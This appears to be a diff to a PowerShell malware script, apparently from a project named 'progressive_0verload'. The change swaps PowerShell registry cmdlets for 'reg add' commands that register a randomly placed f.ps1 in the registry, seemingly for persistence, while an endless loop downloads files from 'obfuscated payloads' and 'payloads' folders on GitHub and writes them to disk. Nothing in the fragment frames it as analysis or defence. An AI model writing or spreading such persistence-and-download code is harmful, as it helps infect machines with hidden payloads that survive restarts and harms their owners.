@@ -23,7 +23,8 @@ $issetup = $false
 if(-not($item)){
     $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $fwdPath = "$fwdPath\f.ps1"
-    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
+    reg add "$basePath" /v $propertyName /t REG_SZ /d $fwdPath /f
+    #New-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
     $issetup = $true
 }
 
@@ -72,7 +73,8 @@ while ($true) {
         if(-not($issetup)){
             $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $fwdPath = "$fwdPath\f.ps1"
-            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
+            reg add "$basePath" /v $propertyName /t REG_SZ /d $fwdPath /f
+            #Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
         }
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
